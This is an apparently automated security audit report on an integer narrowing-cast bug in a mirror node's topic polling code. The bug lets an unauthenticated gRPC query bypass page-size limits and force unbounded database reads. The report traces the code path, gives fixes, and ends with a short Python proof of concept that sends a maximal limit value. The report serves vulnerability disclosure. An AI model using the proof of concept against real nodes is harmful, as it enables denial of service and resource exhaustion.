# Audit Report

## Title
`long`-to-`int` Narrowing Cast in `PollingTopicListener.poll()` Bypasses `maxPageSize` and Returns Unlimited Topic Messages

## Summary
A narrowing cast from `long` to `int` in `PollingTopicListener.poll()` converts any user-supplied limit value greater than `Integer.MAX_VALUE` (e.g., `Long.MAX_VALUE`) into a negative `int`. This negative value causes the internally-constructed `newFilter` to report `hasLimit() == false`, which causes `TopicMessageRepositoryCustomImpl.findByFilter()` to skip `setMaxResults()` entirely, issuing an unbounded `SELECT` that materializes all matching rows into heap memory. The `maxPageSize` guard is also bypassed. The polling repeats indefinitely.

## Finding Description

**Entry point — `ConsensusController.toFilter()`:**

The protobuf `ConsensusTopicQuery.limit` (`uint64`) is mapped directly to `TopicMessageFilter.limit` with no upper-bound check:

```java
final var filter = TopicMessageFilter.builder().limit(query.getLimit());
``` [1](#0-0) 

The only constraint on `TopicMessageFilter.limit` is `@Min(0)`: [2](#0-1) 

`Long.MAX_VALUE` satisfies `@Min(0)`, so validation passes.

**Outer flux cap is ineffective — `TopicMessageServiceImpl.subscribeTopic()`:**

```java
if (filter.hasLimit()) {
    flux = flux.take(filter.getLimit());  // take(Long.MAX_VALUE) = take everything
}
``` [3](#0-2) 

**Propagation to listener — `incomingMessages()`:**

```java
long limit = filter.hasLimit() ? filter.getLimit() - topicContext.getCount().get() : 0;
// Long.MAX_VALUE - 0 = Long.MAX_VALUE
var newFilter = filter.toBuilder().limit(limit).startTime(startTime).build();
return topicListener.listen(newFilter)...
``` [4](#0-3) 

**Root cause — `PollingTopicListener.poll()` lines 54–59:**

```java
int limit = filter.hasLimit()
        ? (int) (filter.getLimit() - context.getCount().get())
        : Integer.MAX_VALUE;
int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();
``` [5](#0-4) 

The arithmetic:
```
(int)(Long.MAX_VALUE - 0L)
= (int)(0x7FFFFFFFFFFFFFFF)
= 0xFFFFFFFF  (lower 32 bits)
= -1          (signed int)
```

`limit = -1`. Then `Math.min(-1, maxPageSize) = -1` (negative always wins `Math.min` against any positive `maxPageSize`). The `newFilter` is built with `limit = -1`.

**`hasLimit()` returns `false` for `-1`:**

```java
public boolean hasLimit() {
    return limit > 0;  // -1 > 0 == false
}
``` [6](#0-5) 

**`setMaxResults` is never called — `TopicMessageRepositoryCustomImpl.findByFilter()`:**

```java
if (filter.hasLimit()) {                              // false — skipped
    typedQuery.setMaxResults((int) filter.getLimit());
}
...
return typedQuery.getResultList().stream();           // all rows loaded
``` [7](#0-6) 

The `newFilter` is constructed via the builder directly, not through Spring's `@Validated` proxy path, so the `@Min(0)` constraint is never re-evaluated on the `-1` value.

**Polling repeats indefinitely:** [8](#0-7) 

## Impact Explanation
Every poll cycle (repeated at `listenerProperties.getInterval()` indefinitely via `RepeatSpec.times(Long.MAX_VALUE)`) issues an unbounded `SELECT` against the `topic_message` table for the targeted topic. `getResultList()` materializes the entire result set into heap memory before streaming. This enables:

- **Data exfiltration**: all historical messages for any topic returned without limit
- **Database DoS**: repeated full-range scans at polling frequency (default 500ms)
- **OOM / heap exhaustion** on the mirror node: the full result set is loaded into memory on each poll cycle

## Likelihood Explanation
The gRPC `ConsensusService.subscribeTopic` endpoint is unauthenticated and publicly accessible. Any gRPC client can send a `ConsensusTopicQuery` with `limit` set to any value greater than `Integer.MAX_VALUE` (e.g., `2147483648` or `Long.MAX_VALUE`). No credentials, special role, or prior knowledge beyond a topic ID is required. The attack is trivially repeatable and scriptable.

## Recommendation

1. **Clamp the limit before the narrowing cast** in `PollingTopicListener.poll()`:
   ```java
   long remaining = filter.hasLimit()
           ? filter.getLimit() - context.getCount().get()
           : listenerProperties.getMaxPageSize();
   int pageSize = (int) Math.min(remaining, listenerProperties.getMaxPageSize());
   ```
   This eliminates the narrowing cast overflow and ensures `maxPageSize` is always the upper bound.

2. **Add an upper-bound constraint** on `TopicMessageFilter.limit`, e.g., `@Max(Integer.MAX_VALUE)` or a domain-specific maximum, so values that would overflow `int` are rejected at the validation layer.

3. **Validate the filter** passed into `incomingMessages()` and `PollingTopicListener.listen()` to ensure `limit` is within a safe range before use.

## Proof of Concept

```python
import grpc
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from hederahashgraph.api.proto.java import consensus_topic_query_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

channel = grpc.insecure_channel("mirror-node-grpc:5600")
stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)

query = consensus_topic_query_pb2.ConsensusTopicQuery(
    topicID=basic_types_pb2.TopicID(topicNum=1234),
    limit=9223372036854775807  # Long.MAX_VALUE
)

# Each response message is an unrestricted DB row; all topic messages are returned
for response in stub.subscribeTopic(query):
    print(response)
```

With `limit = Long.MAX_VALUE`:
- `hasLimit()` is `true` in `TopicMessageServiceImpl` (no outer cap)
- `(int)(Long.MAX_VALUE - 0) = -1` in `PollingTopicListener.poll()`
- `Math.min(-1, 5000) = -1` — `maxPageSize` bypassed
- `hasLimit()` is `false` on the inner filter — `setMaxResults` never called
- `getResultList()` returns all rows for the topic, repeated every 500ms
